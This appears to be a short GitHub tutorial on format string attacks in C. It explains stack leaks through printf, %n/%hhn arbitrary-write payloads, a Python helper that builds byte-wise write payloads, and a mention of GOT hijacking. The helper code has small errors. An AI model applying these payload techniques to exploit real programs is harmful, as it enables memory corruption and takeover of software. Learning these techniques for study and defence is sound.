# Format String Attack
First, take a look at the **printf** example.
```C
printf("%p",a);   //such %p is called "Format String"
//However, many people just use like the following >
printf("a");     //or printf(buf);
```  
Now, you should know that is very **dangerous**. When the author forget to use the format string then hacker can control the format string to attack. OK, let's us learn how to attack.  

## Printf Layout
Sometimes printf will printf some weird value in the following situation.:scream:  
```C
printf("%p %p",a);
```  
We already know that one %p represents a variable. But in the example above, we can see that we use two %p with only one example, then we can see a weird value print out on result without crash. In fact, the weird value comes from the **stack**.:yum:  
The picture following can help you understand more......  
<img src="https://github.com/shinmao/WhyNot-StackOverflow/blob/master/Format-String-Attack/printf%20layout.png" width="626" height="276">   
Therefore, the value are all located in the consecutive position in the following. We can also print the value in specified location with the format string of %(num)$p.  

## Use of Format String
```C
%x: print value with hex  
%s: dump the string in the address  
%p: ptr address  
%n: give the number of string to the parameter  
%(num)c: output at least num of string  
%h: int or short int  
%hh: with one byte
```  
You may get tired with the rules above. Don't worry, I will show how to use it in soon.:+1:  
> When we start to attack, we also need to be careful that printf() will be eaten by the null bytes, this usually happen in 64-bits!  

## Read from arbitrary memory  
  
### First, tell you a little trick
When we neen to make the payload, the number before c is always a complex problem.  
Therefore, how about make up a function to calculate for us.    v Python  
```Python
def fmt(prev,val,index):
  result = ""
  if prev < val :
    result += "%"+str(val-prev)+"c"
  elif prev == val :
    result += ""
  else :  
    result = "%"+str(val-prev+256)+"c"  
  result += "%"+str(index)+"$hhn"
  return result  
#
#Try to play with this function??
#
$target is the value we want to write in  
for i in range(4):
  payload += fmt(prev,(target >> i*8)& 0xff,$index+i)  
  prev = (target >> i*8)& 0xff
```  

## Write to arbitrary memory  
```C
"12345%3$n"   //write len(12345) to the fourth parameter  
"%123c%3$n"   //write 123 to the fourth parameter because "c" is the count
"%123c%3$hhn" //write one byte
"%30c%3$hhn%70c%4$hhn"   //Be careful, this mean we write 100 to the fifth parameter!!
```  
How do we solve the null-byte problem?  
```C
"%45068c%10$hn\xdd\xaa\x00\x00\x00\x00...."   //put the address at the end of payload then we can solve the problem  
```  
Besides, for convenience, we will padding format string to the 8 bytes.  
  
:fire: **GOT hijacking**

## Advanced trick
